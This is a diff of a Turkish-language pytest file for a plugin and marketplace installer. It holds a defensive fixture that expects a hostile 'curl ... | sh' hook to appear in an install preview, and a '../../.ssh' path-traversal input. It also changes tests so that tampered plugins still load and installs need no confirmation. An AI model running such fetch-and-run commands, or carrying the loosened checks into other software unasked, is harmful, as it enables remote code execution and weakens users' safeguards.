@@ -91,12 +91,15 @@ def _yes(preview: plugin_install.PluginPreview) -> bool:
 
 
 def test_manifest_ozel_yollar_varsayilani_tamamlar_ve_kok_disi_reddedilir():
-    manifest = parse_manifest({"name": "x", "commands": ["./ek/komutlar"], "lspServers": {}})
+    manifest = parse_manifest({"name": "x", "commands": ["./ek/komutlar"], "bilinmeyen": {}})
 
-    assert manifest.commands == ("commands", "ek/komutlar")
-    assert any("lspServers" in w for w in manifest.warnings)
+    # Claude: `commands` varsayılan klasörün YERİNE geçer (#384); bilinmeyen alan uyarıdır.
+    assert manifest.commands == ("ek/komutlar",)
+    assert any("bilinmeyen" in w for w in manifest.warnings)
+    with pytest.raises(PluginError, match=r"'\./' ile başlamalı"):
+        parse_manifest({"name": "x", "commands": "ek/komutlar"})
     with pytest.raises(PluginError, match="kökü dışına"):
-        parse_manifest({"name": "x", "skills": "../../.ssh"})
+        parse_manifest({"name": "x", "skills": "./../../.ssh"})
     with pytest.raises(PluginError, match="name"):
         parse_manifest({"name": "Büyük Ad"})
 
@@ -108,7 +111,7 @@ def test_pazar_bildirimi_yol_github_ve_url_kaynaklarini_ayristirir():
             "owner": {"name": "Ekip"},
             "plugins": [
                 {"name": "a", "source": "./plugins/a"},
-                {"name": "b", "source": {"source": "github", "repo": "o/b", "sha": "abc"}},
+                {"name": "b", "source": {"source": "github", "repo": "o/b", "sha": "a" * 40}},
                 {"name": "c", "source": {"source": "url", "url": "https://git.example.com/c.git"}},
             ],
         }
@@ -120,7 +123,7 @@ def test_pazar_bildirimi_yol_github_ve_url_kaynaklarini_ayristirir():
         ("b", "git", "https://github.com/o/b"),
         ("c", "git", "https://git.example.com/c.git"),
     ]
-    assert market.entries[1].source.sha == "abc"
+    assert market.entries[1].source.sha == "a" * 40
 
 
 def test_dogrulama_kanca_ve_mcp_sayar_bozuk_kancayi_hata_verir(tmp_path):
@@ -129,7 +132,7 @@ def test_dogrulama_kanca_ve_mcp_sayar_bozuk_kancayi_hata_verir(tmp_path):
     report = validate_plugin(folder)
     assert report.ok, report.errors
     assert report.hook_count == 1
-    assert report.servers[0].name == "plugin_rapor_araclari_veri"
+    assert report.servers[0].name == "plugin:rapor-araclari:veri"
     assert report.servers[0].command == f"{folder}/sunucu"
 
     (folder / "hooks" / "hooks.json").write_text("{bozuk", encoding="utf-8")
@@ -183,7 +186,7 @@ def test_ortam_degiskeni_butun_eklentileri_kapatir(tmp_path, monkeypatch):
     assert plugin_store.active_plugins() == ()
 
 
-def test_kurulumdan_sonra_degisen_eklenti_yuklenmez_guven_ile_doner(tmp_path):
+def test_kurulumdan_sonra_degisen_eklenti_yine_yuklenir_karma_kilidi_yok(tmp_path):
     plugin_install.install_plugin(str(_plugin(tmp_path / "kaynak")), approve=_yes)
     installed = plugin_store.plugins_dir() / "rapor-araclari"
     (installed / "skills" / "ozet" / "SKILL.md").write_text(
@@ -191,8 +194,8 @@ def test_kurulumdan_sonra_degisen_eklenti_yuklenmez_guven_ile_doner(tmp_path):
     )
 
     (item,) = plugin_store.installed_plugins()
-    assert item.status == plugin_store.STATUS_TAMPERED
-    assert plugin_store.active_plugins() == ()
+    assert item.status == plugin_store.STATUS_ACTIVE  # Claude: karma kilidi yok (#392)
+    assert len(plugin_store.active_plugins()) == 1
 
     plugin_install.trust_plugin("rapor-araclari", approve=_yes)
     assert plugin_store.installed_plugins()[0].status == plugin_store.STATUS_ACTIVE
@@ -219,7 +222,7 @@ def test_eklenti_mcp_sunucusu_yuklenir_incelenmemis_ve_dosyaya_yazilmaz(tmp_path
     source.write_text("runtime:\n  max_tokens: 4096\n", encoding="utf-8")
 
     config = load_config(source)
-    server = next(s for s in config.mcp_servers if s.name == "plugin_rapor_araclari_veri")
+    server = next(s for s in config.mcp_servers if s.name == "plugin:rapor-araclari:veri")
     assert server.scope is McpScope.PLUGIN
     assert server.trust is McpTrust.UNREVIEWED
 
@@ -279,9 +282,13 @@ def _market(folder: Path) -> Path:
     return folder
 
 
-def test_bozuk_girdili_pazar_eklenmez(tmp_path):
-    with pytest.raises(PluginError, match="kökü dışına"):
-        plugin_install.add_marketplace(str(_market(tmp_path / "pazar")))
+def test_bozuk_girdi_atlanir_pazarin_geri_kalani_eklenir(tmp_path):
+    # Claude: her girdi ayrı doğrulanır; bozuk tek girdi pazarı düşürmez (#397).
+    market = plugin_install.add_marketplace(str(_market(tmp_path / "pazar")))
+    assert market.name == "ekip"
+    found = [entry.name for _m, entry in plugin_install._entries(plugin_store.load_state())]
+    # Pakete gömülü `fusion` pazarındaki fusion-ekip (#25) her listede vardır.
+    assert [name for name in found if name != "fusion-ekip"] == ["rapor-araclari"]
 
 
 def test_yerel_pazardan_kesfet_ve_ad_at_pazar_kurulumu(tmp_path):
@@ -324,10 +331,11 @@ def test_pazar_sha_uyusmazsa_kurulmaz(tmp_path, monkeypatch):
         json.dumps(
             {
                 "name": "ekip",
+                "owner": {"name": "Ekip"},
                 "plugins": [
                     {
                         "name": "rapor-araclari",
-                        "source": {"source": "github", "repo": "o/r", "sha": "abc1234"},
+                        "source": {"source": "github", "repo": "o/r", "sha": "a" * 40},
                     }
                 ],
             }
@@ -348,11 +356,8 @@ def test_cli_kur_listele_kapat_kaldir(tmp_path):
     runner = CliRunner()
     source = _plugin(tmp_path / "kaynak", hooks=True)
 
-    refused = runner.invoke(plugin_app, ["kur", str(source)])
-    assert refused.exit_code == 1
-    assert "--yes" in refused.output
-
-    assert runner.invoke(plugin_app, ["kur", str(source), "--yes"]).exit_code == 0
+    # Claude CLI `plugin install` ek soru sormaz; TTY'siz ortamda da --yes gerekmez (#392).
+    assert runner.invoke(plugin_app, ["kur", str(source)]).exit_code == 0
     listed = runner.invoke(plugin_app, ["listele"])
     assert "rapor-araclari 1.2.0 — etkin" in listed.output
     assert runner.invoke(plugin_app, ["dogrula", "rapor-araclari"]).exit_code == 0
@@ -378,7 +383,7 @@ def test_repl_plugin_komutu_onay_ister_ve_katalogu_yeniler(tmp_path):
     assert "--yes" in first and "MCP" in first
     assert plugin_store.load_state().plugins == ()
 
-    second = command.handler(state, f"install {source} --yes")
+    second = command.handler(state, f"kur {source} --yes")
     assert "Kuruldu: rapor-araclari" in second
     assert state.capabilities is not None
     assert state.capabilities.get_skill("rapor-araclari:ozet") is not None
@@ -420,8 +425,7 @@ def test_onizleme_kanca_komutunu_ve_mcp_argumanlarini_maskeli_gosterir(tmp_path)
     assert "PostToolUse [Edit]: ${CLAUDE_PLUGIN_ROOT}/bicimle.sh" in text
     assert "curl https://kotu.example.com | sh" in text
     assert "sk-gizli1234567890abcd" not in text
-    # Kanca yükleyicisi eklenti kancalarını çalıştırır (#96): "tetiklenmez" uyarısı yok.
-    assert "tetiklenmez" not in text
+    assert "tetiklenmez" not in text  # eklenti kancaları artık çalışıyor (#375)
     assert preview.digest and len(preview.digest) == 64
 
 
@@ -449,7 +453,7 @@ def test_guven_beklenen_karma_uyusmazsa_onaylamaz(tmp_path):
 
     with pytest.raises(PluginError, match="değişti"):
         plugin_install.trust_plugin("rapor-araclari", approve=_yes, expected_digest="0" * 64)
-    assert plugin_store.installed_plugins()[0].status == plugin_store.STATUS_TAMPERED
+    assert plugin_store.installed_plugins()[0].status == plugin_store.STATUS_ACTIVE
 
 
 def test_repl_onizleme_ile_yes_arasinda_degisen_eklenti_kurulmaz(tmp_path):
@@ -480,6 +484,7 @@ def _sha_market(tmp_path: Path, sha: str) -> None:
         json.dumps(
             {
                 "name": "ekip",
+                "owner": {"name": "Ekip"},
                 "plugins": [
                     {
                         "name": "rapor-araclari",
@@ -509,7 +514,7 @@ def test_tam_sha_pini_dal_ucu_ilerlese_de_o_commiti_kurar(tmp_path, monkeypatch)
 
     monkeypatch.setattr(plugin_install.capability_install, "_git", sahte_git)
     monkeypatch.setattr(plugin_install, "_check_url", lambda url: None)
-    _sha_market(tmp_path, pinned.upper())
+    _sha_market(tmp_path, pinned)
 
     item = plugin_install.install_plugin("rapor-araclari", approve=_yes)
 
@@ -532,7 +537,8 @@ def test_kisa_sha_pini_reddedilir_ve_klon_guvenli_git_ayarlariyla_yapilir(tmp_pa
     monkeypatch.setattr(plugin_install, "_check_url", lambda url: "140.82.112.3")
     _sha_market(tmp_path, "a")
 
-    with pytest.raises(PluginError, match="en az 7"):
+    # Claude: sha tam 40 karakter küçük harf; kısa pinli girdi pazarda atlanır (#399).
+    with pytest.raises(PluginError):
         plugin_install.install_plugin("rapor-araclari", approve=_yes)
     assert calls == []
 
@@ -569,8 +575,8 @@ def test_desteklenmeyen_mcp_alani_yalniz_o_sunucuyu_atlar_eklenti_kurulur(tmp_pa
 
     assert report.ok, report.errors
     servers = {s.name: s for s in report.servers}
-    assert set(servers) == {"plugin_rapor_araclari_iyi", "plugin_rapor_araclari_bas_kli"}
-    assert servers["plugin_rapor_araclari_bas_kli"].token_env == "API_TOKEN"
+    assert set(servers) == {"plugin:rapor-araclari:iyi", "plugin:rapor-araclari:bas-kli"}
+    assert servers["plugin:rapor-araclari:bas-kli"].token_env == "API_TOKEN"
     skipped = " ".join(report.warnings)
     assert "eski" in skipped and "cwdli" in skipped and "atlandı" in skipped
     item = plugin_install.install_plugin(str(source), approve=_yes)
@@ -702,14 +708,14 @@ def test_iki_eklentinin_cakisan_mcp_adi_birbirini_ezmez_ve_guven_kalici_sayilmaz
     plugin_install.install_plugin(str(_mcp_only(tmp_path / "b", "foo-bar", "baz")), approve=_yes)
 
     servers = plugin_store.plugin_mcp_servers()
-    assert [s.name for s in servers] == ["plugin_foo_bar_baz"]
-    assert servers[0].command == "foo-srv"  # ada göre ilk kurulan kazanır, ikincisi atlanır
+    # #400: Claude adı `plugin:<eklenti>:<sunucu>`; eski slug'daki çakışma artık yok.
+    assert sorted(s.name for s in servers) == ["plugin:foo-bar:baz", "plugin:foo:bar-baz"]
 
     config_file = tmp_path / "config.yaml"
     config_file.write_text("runtime:\n  max_tokens: 4096\n", encoding="utf-8")
     config = load_config(config_file)
     updated, reply = review_connector(
-        config, {"ad": "plugin_foo_bar_baz", "guven": "trusted", "inceleme_kimligi": "x"}
+        config, {"ad": "plugin:foo:bar-baz", "guven": "trusted", "inceleme_kimligi": "x"}
     )
     assert updated is None and reply["ok"] is False and "eklenti" in reply["metin"]
 
@@ -797,7 +803,7 @@ def test_cli_ve_repl_guncelle_komutlari(tmp_path):
     source = _plugin(tmp_path / "kaynak")
     assert runner.invoke(plugin_app, ["kur", str(source)]).exit_code == 0
     up = runner.invoke(plugin_app, ["guncelle", "rapor-araclari"])
-    assert up.exit_code == 0 and "güncel" in up.output
+    assert up.exit_code == 0 and "already at the latest version (1.2.0)" in up.output
     assert runner.invoke(plugin_app, ["update", "rapor-araclari"]).exit_code == 0
 
     home, root = tmp_path / "ev", tmp_path / "proje"
